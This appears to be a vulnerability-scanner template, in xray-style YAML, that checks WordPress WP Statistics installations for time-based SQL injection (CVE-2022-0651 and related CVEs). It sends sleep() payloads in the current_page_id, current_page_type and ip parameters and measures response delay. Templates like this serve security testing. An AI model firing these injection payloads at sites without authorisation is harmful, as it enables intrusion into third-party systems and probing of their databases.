name: poc-yaml-wordpress-wp-statistics-cve-2022-0651-25148-25149-sqli
manual: true
transport: http
set:
    rInt0: randomInt(5, 9)
rules:
    nonce:
        request:
            cache: true
            method: GET
            path: /wp-login.php
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("nonce")
        output:
            nonce: '"nonce\":\"(?P<nonce>.*?)\"};".bsubmatch(response.body)["nonce"]'
    r1:
        request:
            cache: true
            method: GET
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=sleep(0)&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: "true"
        output:
            CheckTimeOuta: response.latency
    r2:
        request:
            cache: true
            method: GET
            read_timeout: "10"
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=sleep({{rInt0}})&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: response.latency - CheckTimeOuta >= rInt0 * 1000 - 1000
    r10:
        request:
            cache: true
            method: GET
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home'-sleep(0)-'&current_page_id=0&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: "true"
        output:
            CheckTimeOutb: response.latency
    r20:
        request:
            cache: true
            method: GET
            read_timeout: "10"
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home'-sleep({{rInt0}})-'&current_page_id=0&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: response.latency - CheckTimeOutb >= rInt0 * 1000 - 1000
    r11:
        request:
            cache: true
            method: GET
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip='-sleep(0)-'&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=0&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: "true"
        output:
            CheckTimeOutc: response.latency
    r21:
        request:
            cache: true
            method: GET
            read_timeout: "10"
            path: /wp-json/wp-statistics/v2/hit?_=11&_wpnonce={{nonce}}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip='-sleep({{rInt0}})-'&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id=0&search_query&page_uri=/&user_id=0
            follow_redirects: false
        expression: response.latency - CheckTimeOutc >= rInt0 * 1000 - 1000
expression: nonce() && (r1() && r2() || r10() && r20() || r11() && r21())
detail:
    author: Â∞èz
    links:
        - https://gist.github.com/Xib3rR4dAr/5dbd58b7f57a5037fe461fba8e696042
    vulnerability:
        level: high